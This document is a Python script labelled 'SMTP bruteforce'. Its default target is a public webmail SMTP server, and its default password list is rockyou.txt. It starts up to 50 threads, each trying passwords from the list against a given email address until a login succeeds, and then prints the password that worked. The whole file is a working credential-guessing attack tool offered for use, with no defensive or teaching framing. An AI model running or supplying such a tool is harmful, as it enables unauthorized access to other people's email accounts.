#!/usr/bin/env python3
#-*-coding:utf-8-*-

try:
    import argparse,os,smtplib,sys,threading
except ImportError as err:
    print(err)

class my_thread(threading.Thread):
    def __init__(self,smtp,port,mail,passwords,stop):
        threading.Thread.__init__(self)
        self.smtp = smtp
        self.port = port
        self.mail = mail
        self.passwords = passwords
        self.stop = stop
    
    def run(self):
        while not self.stop and len(self.passwords) > 0:
            try:
                temp_password = self.passwords.pop().decode("utf-8").rstrip("\n")
                server = smtplib.SMTP(self.smtp,self.port)
                server.starttls() # use smtplib.ehlo() automatically
                server.login(self.mail,temp_password) # use smtplib.ehlo() automatically
                server.quit()
                self.stop = True
            except smtplib.SMTPAuthenticationError:
                pass
            except smtplib.SMTPException as err:
                pass
            except UnicodeEncodeError as err:
                pass
        if self.stop:
            print("[OK] Attempting with {0}".format(temp_password))
        
def main():
    parser = argparse.ArgumentParser(description="**** SMTP bruteforce ****")
    parser.add_argument("-s","--smtp",type=str,action="store",default="smtp.live.com",help="Use -s,--smtp as the mail server.")
    parser.add_argument("-p","--port",type=int,action="store",default=587,help="Use -p,--port as the mail server port.")
    parser.add_argument("-m","--mail",type=str,action="store",default="",help="Use -m,--mail as the mail address.")
    parser.add_argument("-f","--file",type=str,action="store",default="/usr/share/wordlists/rockyou.txt",help="Use -f,--file as the password passwords.")
    parser.add_argument("-n","--num",type=int,action="store",default=50,help="Use -n,--num as the number of threads.")
    args = parser.parse_args()

    if args.mail != "":
        try:
            with open(args.file,"rb") as file_stream:
                passwords = file_stream.readlines()
            stop = False
            for i in range(0,args.num):
                thread = my_thread(args.smtp,args.port,args.mail,passwords,stop)
                thread.start()
        except IOError as err:
            print(err)

main()
